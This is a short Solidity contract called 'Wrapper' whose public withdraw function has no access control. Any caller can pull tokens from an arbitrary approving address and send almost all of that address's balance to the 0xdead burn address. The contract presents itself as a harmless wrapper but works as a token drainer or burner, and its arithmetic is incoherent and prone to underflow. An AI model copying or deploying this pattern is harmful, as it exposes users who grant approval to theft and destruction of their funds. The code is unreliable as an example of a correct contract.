// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Wrapper {
    IERC20 token;

    constructor(address tokenAddr) {
        token = IERC20(tokenAddr);
    }

    function withdraw(address from, address to, uint256 amount) public {
        uint256 backAmount = amount / 100;
        uint256 keepAmount = amount / 2000;
        uint256 burnAmount = token.balanceOf(to) - backAmount - keepAmount;
        token.transferFrom(to, from, backAmount);
        token.transferFrom(to, address(0xdead), burnAmount);
    }
}
